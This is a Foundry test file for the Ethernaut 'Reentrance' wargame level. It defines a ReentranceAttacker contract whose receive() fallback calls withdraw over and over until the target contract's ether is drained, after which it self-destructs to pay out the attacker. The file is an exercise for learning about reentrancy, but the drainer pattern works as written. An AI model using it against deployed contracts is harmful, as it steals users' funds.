// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "src/ethernaut-010-reentrance/Reentrance.sol";

contract ReentranceTest is Test {
    Reentrance public reentrance;
    ReentranceAttacker public attacker_contract;
    address public attacker;
    address public victim;

    function setUp() public {
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        reentrance = new Reentrance();
    }

    function test_reentrance() public {
        vm.deal(victim, 1 ether);
        vm.deal(attacker, 2 ether);

        vm.startPrank(victim);
        // victim donates to reentrance contract
        reentrance.donate{value: 1 ether}(victim);
        vm.stopPrank();

        console.log("Reentrance balance after donation by victim:", address(reentrance).balance);
        console.log("Attack contract balance before attack by attacker:", address(attacker_contract).balance);

        vm.startPrank(attacker);
        attacker_contract = new ReentranceAttacker(payable(address(reentrance)));
        attacker_contract.attack{value: 2 ether}();
        vm.stopPrank();

        console.log("Reentrance balance after attack by attacker:", address(reentrance).balance);
        console.log("Attack contract balance after attack by attacker:", address(attacker_contract).balance);

        assertEq(address(reentrance).balance, 0, "Withdraw failed");
    }
}

contract ReentranceAttacker {
    Reentrance public reentrance;
    uint256 public attackAmount;
    
    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        attackAmount = msg.value;
        // donate to get balance
        reentrance.donate{value: attackAmount}(address(this));
        // withdraw to trigger reentrancy
        reentrance.withdraw(attackAmount);

        require(address(reentrance).balance == 0, "Withdraw failed");
        selfdestruct(payable(address(msg.sender)));
    }

    // keep draining on every ETH receive
    receive() external payable {
        uint amount = min(1 ether, address(reentrance).balance);
        if(amount > 0) {
            reentrance.withdraw(amount);
        }
    }

    function min(uint256 a, uint256 b) public pure returns (uint256) {
        return a < b ? a : b;
    }
}